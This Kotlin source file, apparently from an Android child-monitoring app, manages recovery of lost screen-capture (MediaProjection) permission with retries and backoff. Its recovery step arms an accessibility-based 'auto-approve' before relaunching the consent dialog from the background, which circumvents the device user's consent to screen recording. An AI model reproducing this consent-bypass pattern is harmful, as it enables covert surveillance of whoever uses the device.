package com.childmonitor.capture

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.childmonitor.accessibility.ScreenCaptureAutoApprove
import com.childmonitor.debug.PcpFlowLogger
import com.childmonitor.deviceowner.MediaProjectionConsentActivity
import com.childmonitor.sync.MediaProjectionRecoveryTelemetry

/**
 * Best-effort recovery when MediaProjection consent is lost (process death, onStop).
 * Android cannot restore binder-backed consent across process death — we re-launch
 * the consent flow with accessibility auto-approve armed when possible.
 *
 * Respects background activity launch restrictions: recovery is queued and retried
 * with exponential backoff when a burst is active or consent activity is already shown.
 */
object MediaProjectionRecoveryManager {

    private const val TAG = "MediaProjectionRecovery"
    private const val MAX_ATTEMPTS = 5
    private const val BASE_RETRY_MS = 15_000L
    private const val MAX_RETRY_MS = 120_000L

    @Volatile
    private var recoveryInFlight = false

    @Volatile
    private var queuedReason: String? = null

    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * @return true when recovery was attempted (consent activity launched or queued)
     */
    @Synchronized
    fun attemptRecovery(context: Context, reason: String): Boolean {
        if (MediaProjectionTokenStore.hasValidToken(context)) return false

        if (com.childmonitor.MonitoringPrefs.isPermissionSetupInProgress(context)) {
            Log.d(TAG, "skip recovery — permission setup wizard in progress reason=$reason")
            return false
        }

        if (!ScreenCaptureAutoApprove.isReady(context)) {
            Log.d(TAG, "skip recovery — accessibility not ready reason=$reason")
            return false
        }

        val state = MediaProjectionTokenStore.getConsentState(context)
        if (state == MediaProjectionConsentState.NEVER_GRANTED) {
            Log.d(TAG, "attempt recovery for never-granted consent reason=$reason")
        }

        if (recoveryInFlight) {
            queuedReason = reason
            PcpFlowLogger.log(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "recovery queued",
                "reason=$reason",
            )
            return true
        }

        val attempt = MediaProjectionRecoveryTelemetry.recoveryAttemptCount(context) + 1
        if (attempt > MAX_ATTEMPTS) {
            MediaProjectionTokenStore.markRecoveryFailed(context, "max_attempts")
            MediaProjectionRecoveryTelemetry.recordRecoveryOutcome(context, success = false, reason)
            PcpFlowLogger.warn(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "recovery exhausted",
                "attempts=$attempt reason=$reason",
            )
            return false
        }

        recoveryInFlight = true
        MediaProjectionTokenStore.markRecoveryPending(context)
        MediaProjectionRecoveryTelemetry.recordRecoveryAttempt(context, reason, attempt)

        PcpFlowLogger.warn(
            PcpFlowLogger.Category.MEDIA_PROJECTION,
            "attempting projection recovery",
            "reason=$reason attempt=$attempt",
        )
        Log.w(TAG, "Attempting MediaProjection recovery reason=$reason attempt=$attempt")

        ScreenCaptureAutoApprove.armForConsent(context.applicationContext, 60_000L)
        launchConsentActivity(context.applicationContext)
        scheduleRecoveryWatchdog(context.applicationContext, reason, attempt)
        return true
    }

    /**
     * Async recovery with timeout — used from stream bootstrap when consent may appear shortly.
     */
    fun attemptRecoveryAsync(context: Context, reason: String, timeoutMs: Long = 45_000L): Boolean {
        if (MediaProjectionTokenStore.hasValidToken(context)) return true
        attemptRecovery(context, reason)
        return MediaProjectionConsentHelper.ensureConsent(context.applicationContext, timeoutMs)
    }

    @Synchronized
    fun onRecoveryComplete(context: Context, success: Boolean, reason: String) {
        recoveryInFlight = false
        MediaProjectionRecoveryTelemetry.recordRecoveryOutcome(context, success, reason)
        if (success) {
            queuedReason = null
            MediaProjectionLossHandler.onProjectionRestored(context.applicationContext)
            return
        }

        val nextReason = queuedReason ?: reason
        queuedReason = null
        val attempt = MediaProjectionRecoveryTelemetry.recoveryAttemptCount(context)
        if (attempt >= MAX_ATTEMPTS) {
            MediaProjectionTokenStore.markRecoveryFailed(context, reason)
            return
        }

        val delay = (BASE_RETRY_MS * (1 shl (attempt - 1).coerceAtMost(3))).coerceAtMost(MAX_RETRY_MS)
        PcpFlowLogger.log(
            PcpFlowLogger.Category.MEDIA_PROJECTION,
            "scheduling recovery retry",
            "delayMs=$delay reason=$nextReason",
        )
        mainHandler.postDelayed({ attemptRecovery(context.applicationContext, nextReason) }, delay)
    }

    /** @visibleForTesting */
    internal fun resetForTests() {
        recoveryInFlight = false
        queuedReason = null
        mainHandler.removeCallbacksAndMessages(null)
    }

    private fun launchConsentActivity(context: Context) {
        try {
            MediaProjectionConsentActivity.startFromBackground(context)
        } catch (e: Exception) {
            PcpFlowLogger.error(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "consent activity launch failed",
                e,
            )
            onRecoveryComplete(context, success = false, reason = "launch_failed:${e.message}")
        }
    }

    private fun scheduleRecoveryWatchdog(context: Context, reason: String, attempt: Int) {
        val timeoutMs = 45_000L + (attempt * 5_000L)
        mainHandler.postDelayed({
            if (MediaProjectionTokenStore.hasValidToken(context)) {
                onRecoveryComplete(context, success = true, reason)
                return@postDelayed
            }
            if (MediaProjectionTokenStore.getConsentState(context) !=
                MediaProjectionConsentState.RECOVERY_PENDING
            ) {
                return@postDelayed
            }
            onRecoveryComplete(context, success = false, reason)
        }, timeoutMs)
    }
}
